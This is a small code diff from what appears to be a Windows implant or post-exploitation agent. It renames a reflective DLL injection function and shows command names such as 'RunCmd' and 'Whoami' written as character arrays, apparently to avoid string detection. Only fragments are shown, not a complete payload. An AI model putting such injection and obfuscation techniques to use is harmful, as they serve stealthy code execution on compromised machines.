@@ -20,7 +20,7 @@
 #define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
 #endif
 
-HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize)
+HANDLE loaderInjectRD(PAPI api, LPVOID lpDll, DWORD dwDllSize)
 {
     DWORD loaderOffset;
     REFLECTIVELOADER pReflectiveLoader;
@@ -291,7 +291,7 @@ void myMain()
     ESG_STD_API EsgStdApi = { 0 };
     PESG_STD_API PEsgStdApi = &EsgStdApi;
 
-    pEsgStdDll->Buffer = inject(api, pEsgStdDll->Buffer, pEsgStdDll->Size);
+    pEsgStdDll->Buffer = loaderInjectRD(api, pEsgStdDll->Buffer, pEsgStdDll->Size);
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
